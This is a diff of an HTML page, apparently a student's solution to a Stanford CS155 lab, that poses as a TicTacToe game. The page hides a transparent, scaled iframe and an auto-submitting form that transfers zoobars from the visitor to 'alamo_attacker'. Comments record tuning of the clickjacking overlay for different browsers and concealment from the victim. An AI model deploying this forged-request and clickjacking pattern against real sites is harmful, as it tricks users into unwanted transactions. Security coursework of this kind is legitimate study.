@@ -5,18 +5,26 @@
 		<title>TicTacToe</title>
 		<meta charset="UTF-8"/>
 		<style>
-			/*#outerFrame{display: none;}*/
+			#outerFrame
+			{
+				width: 1000px; 
+				height: 700px; 
+				margin: 0px; 
+				padding: 0px; 
+				background-image: url("http://www.stanford.edu/~rmferrer/pfiles/cs155_sandbox/back.jpg");
+				background-repeat: no-repeat;
+			}
 		</style>
 	</head>
 
 	<body>
 
-		<iframe id='outerFrame' name='outerFrame' scrolling="no" style='width: 100%; height: 700px; margin: 0px; padding: 0px; background-image: url("http://www.stanford.edu/~rmferrer/pfiles/cs155_sandbox/back.jpg"); background-repeat: no-repeat;'></iframe>
+		<iframe id='outerFrame' name='outerFrame' scrolling="no" frameBorder="0"></iframe>
 		
 		
 		<script type="text/javascript">
 		//<![CDATA[
-			var egg = "<iframe id='innerFrame' name='innerFrame' style='width:1000px; height: 2000px; margin: 0px; padding: 0px; opacity: 0.0; transform: scale(26, 36) translate(100px, 720px);'></iframe>" +
+			var egg = "<iframe id='innerFrame' name='innerFrame' style='width:1000px; height: 2000px; margin: 0px; padding: 0px; opacity: 0.0; transform: scale(27, 49) translate(130px, 766px);'></iframe>" +
 				"<form id='transferForm' style='display:none' action='http://zoobar.stanford.edu/transferC.php' method='POST' target='innerFrame'>" +
 				"<input type='text' name='zoobars' value='1'>" +
 				"<input type='text' name='recipient' value='alamo_attacker'>" +
@@ -24,6 +32,17 @@
 				"</form>";
 
 			// TODO: need to change localhost to zoobar.stanford.edu
+			// TODO: need to change recipient to attacker, and zoobars to 10
+			// need to check attack does not get screwed up when resizing window
+			// TODO: need to test on zoobar.stanford.edu in MACOS firefox
+			// TODO: put CSS transform attrs for moz and webkit
+			// for OSX firefox the transforms are : transform: scale(27, 49) translate(130px, 766px);
+			// for Ubuntu firefox the transforms are :  transform: scale(26, 36) translate(100px, 720px);
+			// TODO: is my current TicTacToe interaction OK?
+			// TODO: regarding "it should not be obvious that your page is loading content from zoo- bar.stanford.edu." is is OK
+			// TODO: if lower bar says Waiting for zoobar.stanford.edu for a sec?
+			// TODO: solve OSX, ubuntu layout incompatibility. possibly using anchors to solve OSX vs Ubuntu incompatibility
+			// TODO: beware of race condition in checking number of loads
 
 			var outerFrameDoc = document.getElementById("outerFrame").contentDocument;
 			
@@ -33,7 +52,7 @@
 			outerFrameDoc.close();
 			//Set innerHTML of the body tag.
 			outerFrameDoc.body.innerHTML = egg;
-			
+
 			var transferForm = outerFrameDoc.body.children['transferForm'];
 			transferForm.submit();
 			
